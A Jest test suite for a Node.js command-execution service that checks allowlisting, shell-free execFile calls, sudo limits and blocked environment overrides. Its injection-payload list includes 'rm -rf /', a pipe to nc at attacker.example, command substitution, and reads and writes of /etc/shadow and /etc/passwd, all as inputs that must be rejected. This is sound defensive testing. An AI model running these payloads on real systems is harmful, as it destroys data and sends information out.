const execFileMock = jest.fn();
const spawnMock = jest.fn();
const execMock = jest.fn();

// `exec` is mocked only to prove it is never used.
jest.mock('child_process', () => ({
  execFile: execFileMock,
  spawn: spawnMock,
  exec: execMock,
}));

import fs from 'fs';
import os from 'os';
import path from 'path';
import { EventEmitter } from 'events';
import {
  executeCommand,
  executeStreamCommand,
  runProcess,
  setCommandAuditSink,
} from '../../../src/services/commandExecutor.js';
import { CommandExecutionError } from '../../../src/domain/errors/index.js';

let binDir: string;
const savedEnv: Record<string, string | undefined> = {};
const ENV_KEYS = ['COMMAND_ALLOWLIST', 'COMMAND_SEARCH_PATH', 'ALLOW_SUDO_COMMANDS'];

function succeedWith(stdout = 'ok\n', stderr = '') {
  execFileMock.mockImplementation((_file, _args, _opts, cb) => {
    cb?.(null, stdout, stderr);
    return {} as any;
  });
}

beforeAll(() => {
  binDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cmd-exec-bin-'));
  for (const name of ['echo', 'docker', 'systemctl', 'sudo', 'rm', 'bash']) {
    fs.writeFileSync(path.join(binDir, name), '#!/bin/sh\n', { mode: 0o755 });
  }
  for (const key of ENV_KEYS) savedEnv[key] = process.env[key];
});

afterAll(() => {
  fs.rmSync(binDir, { recursive: true, force: true });
});

beforeEach(() => {
  process.env.COMMAND_SEARCH_PATH = binDir;
  process.env.COMMAND_ALLOWLIST = 'echo,docker,systemctl';
  delete process.env.ALLOW_SUDO_COMMANDS;
  setCommandAuditSink(() => undefined);
});

afterEach(() => {
  jest.clearAllMocks();
  setCommandAuditSink(undefined);
  for (const key of ENV_KEYS) {
    if (savedEnv[key] === undefined) delete process.env[key];
    else process.env[key] = savedEnv[key];
  }
});

describe('commandExecutor.executeCommand', () => {
  it('runs allowlisted commands with execFile, the exact argv and no shell', async () => {
    succeedWith('ok\n');

    const result = await executeCommand('echo ok "two words"');

    expect(execFileMock).toHaveBeenCalledTimes(1);
    expect(execFileMock).toHaveBeenCalledWith(
      path.join(binDir, 'echo'),
      ['ok', 'two words'],
      expect.objectContaining({ shell: false }),
      expect.any(Function)
    );
    expect(execMock).not.toHaveBeenCalled();
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toBe('ok');
    expect(result.duration).toBeGreaterThanOrEqual(0);
  });

  it('accepts the { command, args } contract and passes args verbatim', async () => {
    succeedWith('[]');

    await executeCommand({ command: 'docker', args: ['ps', '--format', '{{json .}}', 'a;b'] });

    expect(execFileMock).toHaveBeenCalledWith(
      path.join(binDir, 'docker'),
      ['ps', '--format', '{{json .}}', 'a;b'],
      expect.objectContaining({ shell: false }),
      expect.any(Function)
    );
  });

  it('captures stderr and exitCode on failure', async () => {
    execFileMock.mockImplementation((_file, _args, _opts, cb) => {
      cb?.({ code: 2, stdout: 'partial output\n', stderr: 'bad things\n' } as any, '', '');
      return {} as any;
    });

    const result = await executeCommand('echo bad');
    expect(result.exitCode).toBe(2);
    expect(result.stdout).toBe('partial output');
    expect(result.stderr).toContain('bad things');
  });

  it('defaults exitCode to 1 when the error has no numeric code, 127 for ENOENT', async () => {
    execFileMock.mockImplementationOnce((_file, _args, _opts, cb) => {
      cb?.({ message: 'oops' } as any, '', '');
      return {} as any;
    });
    const generic = await executeCommand('echo fails');
    expect(generic.exitCode).toBe(1);
    expect(generic.stderr).toContain('oops');

    execFileMock.mockImplementationOnce((_file, _args, _opts, cb) => {
      cb?.({ code: 'ENOENT', message: 'spawn echo ENOENT' } as any, '', '');
      return {} as any;
    });
    const missing = await executeCommand('echo missing');
    expect(missing.exitCode).toBe(127);
  });

  it('merges caller env over process.env', async () => {
    succeedWith();
    await executeCommand('echo hi', { env: { APP_STAGE: 'test' } });
    const opts = execFileMock.mock.calls[0][2];
    expect(opts.env.APP_STAGE).toBe('test');
    expect(opts.env.PATH ?? opts.env.Path).toBe(process.env.PATH ?? process.env.Path);
  });

  const injectionPayloads = [
    'echo hi; rm -rf /',
    'echo hi && rm -rf /',
    'echo hi || rm -rf /',
    'echo hi | nc attacker.example 4444',
    'echo `id`',
    'echo $(id)',
    'echo hi\nrm -rf /',
    'echo pwned > /etc/passwd',
    'echo hi < /etc/shadow',
    '/bin/rm -rf /',
    'rm -rf /',
    '../../bin/rm -rf /',
    'FOO=1 rm -rf /',
    'bash -c id',
  ];

  it.each(injectionPayloads)('rejects %j with 403 before reaching child_process', async (payload) => {
    const audit = jest.fn();
    setCommandAuditSink(audit);

    await expect(executeCommand(payload, { source: 'test' })).rejects.toMatchObject({ statusCode: 403 });

    expect(execFileMock).not.toHaveBeenCalled();
    expect(spawnMock).not.toHaveBeenCalled();
    expect(execMock).not.toHaveBeenCalled();
    expect(audit).toHaveBeenCalledWith(expect.objectContaining({ statusCode: 403, source: 'test' }));
  });

  it.each(['PATH', 'LD_PRELOAD', 'NODE_OPTIONS'])('rejects env override of %s', async (key) => {
    await expect(executeCommand('echo hi', { env: { [key]: '/tmp/evil' } })).rejects.toBeInstanceOf(CommandExecutionError);
    expect(execFileMock).not.toHaveBeenCalled();
  });

  it('runs sudo as "sudo -n <absolute path>" and honours ALLOW_SUDO_COMMANDS', async () => {
    succeedWith();
    await executeCommand({ command: 'sudo', args: ['-n', 'systemctl', 'restart', 'nginx'] });
    expect(execFileMock).toHaveBeenCalledWith(
      path.join(binDir, 'sudo'),
      ['-n', path.join(binDir, 'systemctl'), 'restart', 'nginx'],
      expect.objectContaining({ shell: false }),
      expect.any(Function)
    );

    execFileMock.mockClear();
    process.env.ALLOW_SUDO_COMMANDS = 'false';
    await expect(executeCommand('sudo systemctl restart nginx')).rejects.toMatchObject({ statusCode: 403 });
    expect(execFileMock).not.toHaveBeenCalled();
  });

  it('denies everything when COMMAND_ALLOWLIST is empty', async () => {
    process.env.COMMAND_ALLOWLIST = '';
    await expect(executeCommand('echo hi')).rejects.toMatchObject({ statusCode: 403 });
    expect(execFileMock).not.toHaveBeenCalled();
  });

  it('keeps the denial when the audit sink throws', async () => {
    setCommandAuditSink(() => {
      throw new Error('disk full');
    });
    await expect(executeCommand('rm -rf /')).rejects.toMatchObject({ statusCode: 403 });
  });
});

describe('commandExecutor.runProcess (internal fixed argv)', () => {
  it('resolves bare names in the trusted dirs and never uses a shell', async () => {
    succeedWith('x');
    await runProcess('docker', ['ps', '--format', '{{json .}}']);
    expect(execFileMock).toHaveBeenCalledWith(
      path.join(binDir, 'docker'),
      ['ps', '--format', '{{json .}}'],
      expect.objectContaining({ shell: false }),
      expect.any(Function)
    );
  });

  it('falls back to the bare name when a program is not in the trusted dirs', async () => {
    succeedWith('x');
    await runProcess('not-installed-tool', ['--version']);
    expect(execFileMock.mock.calls[0][0]).toBe('not-installed-tool');
  });
});

describe('commandExecutor.executeStreamCommand', () => {
  function mockChild() {
    const child = { stdout: new EventEmitter(), stderr: new EventEmitter(), handlers: {} as Record<string, any>, on: jest.fn() };
    child.on.mockImplementation((event: string, cb: any) => {
      child.handlers[event] = cb;
    });
    spawnMock.mockReturnValue(child);
    return child;
  }

  it('spawns the resolved program without a shell', () => {
    mockChild();
    executeStreamCommand('docker', ['logs', '-f', 'app'], jest.fn(), jest.fn(), jest.fn());
    expect(spawnMock).toHaveBeenCalledWith(
      path.join(binDir, 'docker'),
      ['logs', '-f', 'app'],
      expect.objectContaining({ shell: false })
    );
  });

  it('handles close event without code (defaults to 0)', () => {
    const child = mockChild();
    const onClose = jest.fn();
    executeStreamCommand('echo', ['arg'], jest.fn(), jest.fn(), onClose);
    child.handlers.close(undefined);
    expect(onClose).toHaveBeenCalledWith(0);
  });

  it('forwards data events from stdout and stderr', () => {
    const child = mockChild();
    const onData = jest.fn();
    const onError = jest.fn();
    executeStreamCommand('echo', ['arg'], onData, onError, jest.fn());

    child.stdout.emit('data', Buffer.from('stdout text'));
    child.stderr.emit('data', Buffer.from('stderr text'));

    expect(onData).toHaveBeenCalledWith('stdout text');
    expect(onError).toHaveBeenCalledWith('stderr text');
  });

  it('throws before spawning a non-allowlisted or injected command', () => {
    expect(() => executeStreamCommand('rm', ['-rf', '/'], jest.fn(), jest.fn(), jest.fn())).toThrow(CommandExecutionError);
    expect(() => executeStreamCommand('echo;id', [], jest.fn(), jest.fn(), jest.fn())).toThrow(CommandExecutionError);
    expect(spawnMock).not.toHaveBeenCalled();
  });
});
